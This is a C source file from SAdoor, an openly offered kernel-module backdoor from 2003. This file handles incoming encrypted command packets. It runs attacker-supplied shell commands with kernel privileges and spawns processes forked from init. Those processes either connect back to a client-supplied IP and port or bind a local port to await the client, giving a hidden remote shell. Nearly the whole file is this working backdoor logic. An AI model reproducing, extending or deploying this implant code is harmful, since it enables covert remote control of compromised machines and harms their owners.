/*
 *  File: command.c
 *  Author: Claes M. Nyberg <md0claes@mdstud.chalmers.se>
 *  Description: SAdoor kmod command translator.
 *  Version: 1.0
 *  Date: Fri Jun 27 11:17:29 CEST 2003
 *  
 *  Copyright (c) 2003 Claes M. Nyberg <md0claes@mdstud.chalmers.se>
 *  All rights reserved, all wrongs reversed.
 *      
 *  Redistribution and use in source and binary forms, with or without
 *  modification, are permitted provided that the following conditions
 *  are met:
 *
 *  1. Redistributions of source code must retain the above copyright
 *     notice, this list of conditions and the following disclaimer.
 *  2. Redistributions in binary form must reproduce the above copyright
 *     notice, this list of conditions and the following disclaimer in the
 *     documentation and/or other materials provided with the distribution.
 *  3. The name of author may not be used to endorse or promote products
 *     derived from this software without specific prior written permission.
 *      
 *  THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES,
 *  INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY
 *  AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL
 *  THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 *  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
 *  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS;
 *  OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
 *  WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR
 *  OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF 
 *  ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */     

#include <sys/types.h>
#include <sys/param.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/kthread.h>
#include <sys/unistd.h>
#include <sys/malloc.h>
#include <sys/param.h>
#include <sys/kthread.h>
#include <sys/proc.h>
#include <sys/protosw.h>
#include <sys/socket.h>

#include "sadoor.h"

/* Global variables */
extern struct sa_options opt;
extern struct sa_pkts *packets;

/* Private routines */
static int setup_command(struct sacmd *, 
        size_t, struct bfish_key *, struct timeval *);
static void connect_back(void *);
static void accept_connection(void *);

struct connect_back_args {
     struct connect_cmd *ccmd;
     struct bfish_key *bk;
};

struct accept_connection_args {
    struct accept_cmd *acmd;
    struct bfish_key *bk;
};
          

/*
 * Connect back to the (hopefully) awaiting client.
 * This function is called from a fork from init below.
 */
static void
connect_back(void *arg)
{
    int sock_fd;
    int exitval;
    int error;
	register_t retval[2];
    struct proc *p;
    struct connect_back_args *ca;

    ca = (struct connect_back_args *)arg;
    p = curproc;

	if (p == NULL) {
		log(1, "connect_back(): curproc is NULL\n");
		return;
	}

    /* Create a new session (session leader,
     * group leader and no controlling terminal) */
    if ( (error = sys_setsid(p, NULL, retval)))
        log(2, "Warning: setsid() failed: %d\n", error);

    /* Connect back */
    if ( (sock_fd = conn_connect(ca->ccmd->ip, ca->ccmd->port)) < 0)
        exit1(p, 1);

    /* Handle the connection */
    debug(3, "Calling handle_connection from pid %d\n", p->p_pid);
    exitval = handle_connection(sock_fd, ca->bk);
    kspace_free(arg);
    exit1(p, exitval);
}

/*
 * Wait for the client to connect.
 * This function is called from a fork from init below.
 */
static void
accept_connection(void *arg)
{
    int sock_fd;
    int exitval;
    int client_fd;
    int error;
	register_t retval[2];
    struct in_addr ipa;
    struct proc *p;
    struct accept_connection_args *aa;

    p = curproc;

    if (p == NULL) {
        log(1, "connect_back(): curproc is NULL\n");
    	return;
	}

    aa = (struct accept_connection_args *)arg;
    ipa.s_addr = aa->acmd->cip;

    /* Create a new session (session leader,
     * group leader and no controlling terminal) */
    if ( (error = sys_setsid(p, NULL, retval)))
        log(2, "Warning: setsid() failed: %d\n", error);

    /* Attempt to bind socket to the supplied address */
    if ( (sock_fd = conn_bindsock(INADDR_ANY, aa->acmd->lport)) < 0) 
        exit1(p, 1);

    debug(1, "Awaiting connection from %s:%u to local port %u\n",
        inet_ntoa(ipa), ntohs(aa->acmd->cport), ntohs(aa->acmd->lport));

    if ( (client_fd = conn_accept(sock_fd, SAKMOD_CONNECTION_TIMEOUT,
            aa->acmd->cip, aa->acmd->cport)) < 0)
        exit1(p, 1);

    exitval = handle_connection(client_fd, aa->bk);
    kspace_free(arg);
    exit1(p, exitval);
}

/*
 * Setup SAdoor command
 * Returns 1 on success and 0 on error.
 */
static int
setup_command(struct sacmd *command, size_t len, 
        struct bfish_key *bk, struct timeval *saveiv)
{
    if (len == 0)
        return(1);

    if (len < CMD_HDR_LEN) {
        debug(1, "Error: Received command shorter than minimum length\n");
        return(0);
    }

    if (saveiv != NULL) {
        saveiv->tv_sec = (long)ntohl(*((uint32_t *)(&command->iv[0])));
        saveiv->tv_usec = (long)ntohl(*((uint32_t *)(&command->iv[4])));
    }

    /* Decrypt command (IV should be in network byte order) */
#ifndef SADOOR_DISABLE_ENCRYPTION
    bfish_cfb_decrypt((uint8_t *)&(command->length), len-8, command->iv, 8, bk);
#endif /* SADOOR_DISABLE_ENCRYPTION */

    /* Convert to host endian */
    command->length = ntohs(command->length);
    command->code = ntohs(command->code);

    if ( (len - CMD_HDR_LEN) < GET_DATA_LENGTH(command)) {
        debug(1, "Error: Length of data (%u bytes) is shorter than length of "
            "command (%u bytes), bad key?\n", len, GET_DATA_LENGTH(command));
        return(0);
    }

    return(1);    
}

/*
 * Examine received command and perform the desired action. 
 * Exits 1 from kernel thread on error, and 0 on success.
 */
void
handle_command(void *arg)
{
    u_char setupcmd = 1;    /* Flag telling that command needs to be set up */
    struct sacmd *command;
    size_t len;
    struct bfish_key *bk;
    register_t kern_retval = 1;    /* Return error by default */

    if (arg == NULL) {
        log(1, "Error: handle_command(): Received NULL pointer as argument\n");
        return;
    }

    len = ((struct handle_command_args *)arg)->len;

    if (len > sizeof(struct sacmd)) {
        debug(1, "Error: Command data to large (%u bytes, max = %u bytes)\n",
            len, sizeof(struct sacmd));
        goto finished;
    }

    /* Set command */
    command = (struct sacmd *)(((struct handle_command_args *)arg)->cmd);

    /* Set up key */
#ifndef SADOOR_DISABLE_ENCRYPTION
    {
        int keys;
        keys = (sizeof(SAKMOD_BFISH_KEY)-1) > 56 ? 56: sizeof(SAKMOD_BFISH_KEY)-1;
        bk = (struct bfish_key *)kspace_calloc(sizeof(struct bfish_key));
        
        debug(3, "Setting up blowfish key (length = %d)\n", keys);
        
        if ( (bfish_keyinit(SAKMOD_BFISH_KEY, keys, bk)) == NULL) {
            log(1, "Error: Could not init blowfish key\n");
            goto freebk;
        }
    }
    debug(3, "Blowfish key initiated\n");
#endif /* SADOOR_DISABLE_ENCRYPTION */

#ifdef SAKMOD_ENABLE_REPLAY_PROTECTION
    /* Check for replay attack/clock skew */
    if (len != 0) {
        struct timeval tv;

        if (!setup_command(command, len, bk, &tv))
            goto freebk;

        /* Flag that command has been setup */
        setupcmd = 0;

        /* Check command->code first to avoid DOS by
        * sending bad command packets with a high timestamp */
        if (!ISVALID_COMMANDCODE(command->code)) {
            debug(1, "Command packet error: Unrecognized command->code: "
                "0x%02x\n", command->code);
            goto freebk;
        }

        if (!replay_check(tv.tv_sec, tv.tv_usec)) 
            goto freebk;

        if (replay_add(tv.tv_sec, tv.tv_usec) < 0) 
            goto freebk;
    }
#endif /* SAKMOD_ENABLE_REPLAY_PROTECTION */


#ifndef SAKMOD_NULLCOMMAND
    if (len == 0) {
        debug(1, "Warning: Received NULL command, but no command set\n");
        goto freebk;
    }
#else
    /* Empty command, run default command */
    if (len == 0) {
        int sysret; 
		u_char *shcmd;

		shcmd = (u_char *)kspace_calloc(sizeof(SAKMOD_NULLCOMMAND));
		memcpy(shcmd, SAKMOD_NULLCOMMAND, sizeof(SAKMOD_NULLCOMMAND)-1);

        debug(1, "Received NULL command, running default \"%s\"\n", 
            SAKMOD_NULLCOMMAND);

        if ( (sysret = kernel_system(SAKMOD_NULLCOMMAND)) != 0) {
            debug(1, "kernel_system(): %d\n", sysret);
			kspace_free(shcmd);
		}
            
        kern_retval = sysret;
        goto freebk;
    }
#endif /* SAKMOD_NULLCOMMAND */

    /* Setup command if replay protection is disabled */
    if ((setupcmd) && !setup_command(command, len, bk, NULL)) 
        goto freebk;

    /* Simple shell command */
    if (command->code == SADOOR_CMD_RUN) {
        int sysret;
		u_char *shcmd;
		
        /* Null terminate */
        *((u_char *)command->data + GET_DATA_LENGTH(command)) = '\0';

        if (SAKMOD_NOSINGLE_FLAG) {
            debug(1, "Warning: Received disabled RUN command, "
                "refusing to run \"%s\"\n", (u_char *)command->data);
            
            goto freebk;
        }
        
		shcmd = (u_char *)kspace_calloc(GET_DATA_LENGTH(command)+1);
		memcpy(shcmd, command->data, GET_DATA_LENGTH(command));
		
		debug(1, "Received RUN command\n");
        debug(2, "running \"%s\"\n", shcmd);

        if ( (sysret = kernel_system(shcmd)) != 0) {
            debug(1, "kernel_system(): Failed to run received command: %d", sysret);
        	kspace_free(shcmd);
		}
		
        kern_retval = sysret;
        goto freebk;
    }
    /* Connect back to client */
    if (command->code == SADOOR_CMD_CONNECT) {
        struct connect_back_args *ca;

        if (SAKMOD_NOCONNECT_FLAG) {
            debug(1, "Warning: received disabled CONNECT BACK command\n");
            goto freebk;
        }
        
        debug(1, "Received CONNECT BACK command\n");
        
        if (GET_DATA_LENGTH(command) < sizeof(struct connect_cmd)) {
            log(1, "Error: CONNECT BACK command data is to short to "
                "contain IPv4 address and TCP port\n");
            goto freebk;
        }

        ca = (struct connect_back_args *)kspace_calloc(sizeof(struct connect_back_args)+
			GET_DATA_LENGTH(command));
        ca->ccmd = (struct connect_cmd *)(ca + 1);
		memcpy(ca->ccmd, command->data, GET_DATA_LENGTH(command));
        ca->bk = bk;
        
        /* Fork from init and let the child setup and handle the connection */
        fork_from_init(connect_back, (void *)ca);

        kern_retval = 0;
        goto finished;
    }

    /* Wait for connecting client */
    else if (command->code == SADOOR_CMD_ACCEPT) {
        struct accept_connection_args *aa;

        if (SAKMOD_NOACCEPT_FLAG) {
            debug(1, "Warning: Received disabled ACCEPT command\n");
            goto freebk;
        }
        debug(1, "Received ACCEPT command\n");

        if (GET_DATA_LENGTH(command) < sizeof(struct accept_cmd)) {
            log(1, "Error: ACCEPT command data is to short to "
                "contain necessary information\n");
            goto freebk;
        }

        aa = (struct accept_connection_args *)kspace_calloc(sizeof(struct accept_connection_args)+
			GET_DATA_LENGTH(command));
        aa->acmd = (struct accept_cmd *)(aa+1);
		memcpy(aa->acmd, command->data, GET_DATA_LENGTH(command));		
        aa->bk = bk;
        
        /* Fork from init and let the child setup and handle the connection */
        fork_from_init(accept_connection, (void *)aa);

        kern_retval = 0;
        goto finished;
    }
    else {
        debug(1, "Command packet error: Unrecognized command code: "
            "0x%02x\n", command->code);
    }

    finished:
        kspace_free(arg);
        kthread_exit(kern_retval); 

    freebk:
        kspace_free(bk);
        kspace_free(arg);
        kthread_exit(kern_retval); 
}
